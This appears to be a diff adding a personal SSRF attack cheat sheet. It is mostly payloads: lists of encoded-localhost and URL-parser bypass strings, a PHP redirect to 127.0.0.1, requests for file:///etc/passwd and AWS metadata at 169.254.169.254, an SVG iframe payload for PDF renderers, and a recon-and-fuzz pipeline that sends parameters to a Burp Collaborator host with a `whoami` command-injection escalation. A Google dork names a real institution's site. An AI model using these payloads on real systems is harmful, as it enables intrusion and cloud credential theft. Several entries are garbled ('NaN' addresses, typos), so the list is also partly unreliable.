@@ -1,0 +1,188 @@
+
+
+    SSRF
+    map the application
+        identify any request parameter that contains hostnames, ip addresses or full url
+                 
+    for each request parameter, modify its value to specify an alternative resources and observes how the application responds 
+        if a defence is in place, attempt to circumn=vent or bypass it using know techniques
+     
+    for each request parameter, modify its value to a server on the internet that you control and monitor the server for incomming request
+    
+    
+    regular/ In band SSrf
+    if the application does not allow for arbitary user-supplied Urls, try to bypass defenses using the following techniques
+         use different encoding schemes
+            decimal-encoded version of 127.0.0  i.e  2130706433
+            127.1 resolves to 127.0.0.1
+            octal rep of 127.0.0.1  i.e  01700000001
+     
+     register a domain name that rsolves to internal ip address (dns rebinding )
+     use your own server that rediriect to an internal ip addresses (http redirection)
+     
+     
+     blind ssrf / out of band ssrf
+     attemps to trigger an http request to an external system that you control and monitor the system for network interaction from the vulnerabble server 
+       using burp collaborator
+       
+       
+       //use ngrok for your server request ..    ngrok http 80  and copy the port forward and paste to browsers
+       allows excalate to lfi
+       google dorks for ssrf
+       site:https://somaiya.edu.in ext:php inurl:download.php
+        https://example.com/viewimage/?url=file:///etc/passwd  ///
+        https://example.com/viewimage/?url=http://169.254.169.254/latest/meta-data     // this is redirtling the file to aws/metadata
+       
+       TIP 1
+       
+       If you found an SSRF vulnerability that runs on EC2, try requesting http://169.254.169.254/latest/meta-data/. This will return a lot of useful information for you to understand the infrastructure and may reveal Amazon S3 access tokens, API tokens, and more. You may also want to download http://169.254.169.254/latest/user-data/ and unzip the data.
+       TIP 2
+       //File uploads: instead of uploading a file, try sending a URL and see if it downloads the content of the URL. Here’s an example.//
+       automaton with SSRF MAP
+        python3 ssrfmap.py -r ssrf.txt -m readfiles -p "pdf_path"       check docs on ssrfmap         ssrf.txt is a request to burp
+
+      
+      
+      
+         ?url=http://safesite.com&site.com
+  ?url=http://////////////site.com/
+?url=http://site@com/account/edit.aspx
+?url=http://site.com/account/edit.aspx
+?url=http://safesite.com?.site.com
+?url=http://safesite.com#.site.com
+?url=http://safesite.com\.site.com/domain
+?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
+?url=https://192.10.10.3/
+?url=https://192.10.10.2?.192.10.10.3/
+?url=https://192.10.10.2#.192.10.10.3/
+?url=https://192.10.10.2\.192.10.10.3/
+?url=http://127.0.0.1/status/
+?url=http://localhost:8000/status/
+?url=http://site.com/domain.php
+<?php
+header(‘Location: http://127.0.0.1:8080/status');
+?>
+             
+
+                http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
+   http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
+http://////////////site.com/
+http://0000::1:80/
+http://000330.0000072.0000326.00000343
+http://000NaN.000NaN
+http://0177.00.00.01
+http://017700000001
+http://0330.072.0326.0343
+http://033016553343
+http://0NaN
+http://0NaN.0NaN
+http://0x0NaN0NaN
+http://0x7f000001/
+http://0xd8.0x3a.0xd6.0xe3
+http://0xd8.0x3a.0xd6e3
+http://0xd8.0x3ad6e3
+http://0xd83ad6e3
+http://0xNaN.0xaN0NaN
+http://0xNaN.0xNa0x0NaN
+http://0xNaN.0xNaN
+http://127.0.0.1/status/
+http://127.1/
+http://2130706433/
+http://216.0x3a.00000000326.0xe3
+http://3627734755
+http://[::]:80/
+http://localhost:8000/status/
+http://NaN
+http://safesite.com#.site.com
+http://safesite.com&site.com
+http://safesite.com?.site.com
+http://safesite.com\.site.com/domain
+http://shmilon.0xNaN.undefined.undefined
+http://site.com/account/edit.aspx
+http://site.com/domain.php
+http://site@com/account/edit.aspx
+http://whitelisted@127.0.0.1
+https://192.10.10.2#.192.10.10.3/
+https://192.10.10.2?.192.10.10.3/
+https://192.10.10.2\.192.10.10.3/
+https://192.10.10.3/
+https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
+<?php
+header('Location: http://127.0.0.1:8080/status');
+?>
+
+    # Localhost bypasses
+0
+127.00.1
+127.0.01
+0.00.0
+0.0.00
+127.1.0.1
+127.10.1
+127.1.01
+0177.1
+0177.0001.0001
+0x0.0x0.0x0.0x0
+0000.0000.0000.0000
+0x7f.0x0.0x0.0x1
+0177.0000.0000.0001
+0177.0001.0000..0001
+0x7f.0x1.0x0.0x1
+0x7f.0x1.0x1
+
+# Blind SSRF
+- Review Forms
+- Contact Us
+- Password fields
+- Contact or profile info (Names, Addresses)
+- User Agent
+
+# SSRF through video upload
+# https://hackerone.com/reports/1062888
+# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
+
+# SSRF in pdf rendering
+<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
+    <g>
+        <foreignObject width="800" height="500">
+            <body xmlns="http://www.w3.org/1999/xhtml">
+                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
+            </body>
+        </foreignObject>
+    </g>
+</svg>
+ 
+      TIPS 1 on ssrf
+  1      gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
+     then create a burpcollaburaor payload server and use qsreplace to replace all parameter value with burpcollaborator server payload and fuzz it with ffuf
+  2  cat testblindssrf.txt | qsreplace “http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt   
+     and then ffuf
+  3  ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
+  
+  Now  check whether if we get any http request hit on our burp collaborator server
+  
+  if yes , escalate to Rce with burp collabator
+    example https://url?burpcollabuarator?`payload`
+  
+  http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami` and check the link on your browers
+  
+  
+  TIP 2 on ssrf 
+  do some subdomain findings
+  check weyback machine for endpoint on subdomian
+  
+  find a parameter that takes URL as the value then  directly look for the SSRF vulnerability.
+  search for add./endpoint
+  try new endpoint and check for http response 
+  check cors
+   give to Burp Collaborator/ ngrok  instance to see if it would fetch my instance:
+  bruteforce new endpoint and check for paths and directories  
+  
+  tip3 
+   
+     dig (url)
+     ip ../etc/password
+     199.1.3.134/../etc/passwd      you can check for other payload 
+     search for whois information
+     proceeded to make the API call to read AWS instance metadata (http://169.254.169.254/latest/meta-data/ 
+     check for url caching works if there, try to understand how url caching works    ////  
